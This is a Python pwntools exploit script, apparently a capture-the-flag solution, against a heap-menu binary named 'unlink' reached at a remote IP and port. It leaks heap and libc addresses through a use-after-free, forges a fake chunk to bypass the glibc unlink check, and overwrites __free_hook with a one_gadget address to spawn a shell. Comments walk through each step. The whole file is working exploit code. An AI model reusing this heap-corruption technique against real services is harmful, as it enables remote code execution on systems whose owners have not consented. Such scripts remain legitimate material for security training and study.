from pwn import *

#p = process(['./unlink'],env={'LD_PRELOAD':'./libc.so.6'},aslr='FALSE')
p = remote("124.16.75.162", 31053)
#libc = ELF("./libc.so.6")

def new(idx, data):
	p.recvuntil("your choise:\n")
	p.send("1\n")
	p.recvuntil("index:")
	p.sendline(str(idx))
	p.recvuntil("plz input content:\n")
	p.send(data)

def edit(idx, data):
	p.recvuntil("your choise:\n")
	p.send("2\n")
	p.recvuntil("index:")
	p.sendline(str(idx))
	p.recvuntil("plz input content:")
	p.send(data)

def show(idx):
	p.recvuntil("your choise:\n")
	p.send("3\n")
	p.recvuntil("index:")
	p.sendline(str(idx))

def free(idx):
	p.recvuntil("your choise:\n")
	p.send("4\n")
	p.recvuntil("index:")
	p.sendline(str(idx))

def main():
	context.log_level = "debug"
	one_gadget = 0x4527a
	free_hook = 0x3c67a8
	malloc_hook = 0x3c4b10
	bss_addr = 0x6020c0 + 0x20 #very important, cur_chk, chunk[4], bypass unlink check	

	#gdb.attach(p, "b main")
	new(0, "AAAA\n")
	new(1, "BBBB\n")
	new(2, "CCCC\n")
	new(3, "DDDD\n")
	new(4, p64(0xa0) + p64(0x31) + p64(bss_addr - 0x18) + p64(bss_addr - 0x10)) # Fake_chunk start here, 0xa0 and 0x31 makes the heap correct, 
										    # unlink after leak libc addr
	new(5, p64(0x30) + p64(0x30)) # chunk to be free to cause unlink
	
	free(1)
	free(0)
	show(0)
	chunk1_addr = u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))
	heap_addr = chunk1_addr - 0x30
	print "Heap_base_addr:",hex(heap_addr)


	edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))
	new(6, p64(0) + p64(0xa1)) #chunk 0
	#pause()
	new(7, 'A'*8 + p64(0xa1)) # Here modify chunk1's [pre_size|size], because alloc get the addr [&chunk0 + 0x20], it's size is 0xa0
				  # so if it's be freed, then add to unsorted bin, then the [main_arena+0x88] will be it's FD and BK
	free(1)			  # At the same time, free causes chunk[1](0xa0) and chunk4(0x30) merged an unsorted bin(0xd0), cause unlink
				  # then then chunk_list[4](global variable) change to be (bss_addr-0x18).
	show(1) #leak_libc_addr
	#<main_arena+88> addr-(0x3cb20+0x58)=addr-0x3c4b78, main_arena can be find by loading libc.so into IDA, __malloc_trim() function's end
	libc_base = u64(p.recvline()[ : -1].ljust(8, '\x00'))-0x3c4b78
	print "libc_base_addr:",hex(libc_base)
	#pause()
	edit(4,p64(libc_base + free_hook)) # Free_hook write to the addr (bss_addr-0x18) actually is &chunk[1], 
					   # then edit(chunk[1]) will change the free_hook addr 
	edit(1, p64(libc_base + one_gadget)[:-1]) # Then write one_gadget addr to the free_hook addr, then call free() will get shell. 
	free(1)
	
	p.interactive()
	

if  __name__ == "__main__":
	main()
	
